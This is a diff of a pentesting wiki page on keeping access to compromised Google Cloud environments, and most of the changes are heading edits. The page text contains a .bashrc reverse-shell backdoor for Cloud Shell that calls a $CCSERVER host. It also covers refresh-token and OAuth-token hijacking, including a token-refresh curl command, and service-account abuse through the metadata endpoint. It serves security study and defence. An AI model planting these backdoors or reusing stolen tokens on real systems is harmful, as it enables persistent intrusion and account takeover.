@@ -17,13 +17,11 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# GCP - Persistance
-
 These are useful techniques once, somehow, you have compromised some GCP credentials or machine running in a GCP environment.
 
-## Google’s Cloud Shell <a href="#e5eb" id="e5eb"></a>
+# Google’s Cloud Shell <a href="#e5eb" id="e5eb"></a>
 
-### Persistent Backdoor
+## Persistent Backdoor
 
 [**Google Cloud Shell**](https://cloud.google.com/shell/)  provides you with command-line access to your cloud resources directly from your browser without any associated cost.
 
@@ -41,7 +39,7 @@ This basically means that an attacker may put a backdoor in the home directory o
 echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
 ```
 
-### Container Escape
+## Container Escape
 
 Note that the Google Cloud Shell runs inside a container, you can **easily escape to the host** by doing:
 
@@ -70,9 +68,9 @@ https://www.googleapis.com/auth/logging.write
 https://www.googleapis.com/auth/monitoring.write
 ```
 
-## Token Hijacking
+# Token Hijacking
 
-### Authenticated User
+## Authenticated User
 
 If you manage to access the home folder of an **authenticated user in GCP**, by **default**, you will be able to **get tokens for that user as long as you want** without needing to authenticated and independently on the machine you use his tokens from and even if the user has MFA configured.
 
@@ -96,20 +94,20 @@ To get a new refreshed access token with the refresh token, client ID, and clien
 curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
 ```
 
-### Service Accounts
+## Service Accounts
 
 Just like with authenticated users, if you manage to **compromise the private key file** of a service account you will be able to **access it usually as long as you want**.\
 However, if you steal the **OAuth token** of a service account this can be even more interesting, because, even if by default these tokens are useful just for an hour, if the **victim deletes the private api key, the OAuh token will still be valid until it expires**.
 
-### Metadata
+## Metadata
 
 Obviously, as long as you are inside a machine running in the GCP environment you will be able to **access the service account attached to that machine contacting the metadata endpoint** (note that the Oauth tokens you can access in this endpoint are usually restricted by scopes).
 
-### Remediations
+## Remediations
 
 Some remediations for these techniques are explained in [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)
 
-## References
+# References
 
 * [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
 * [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
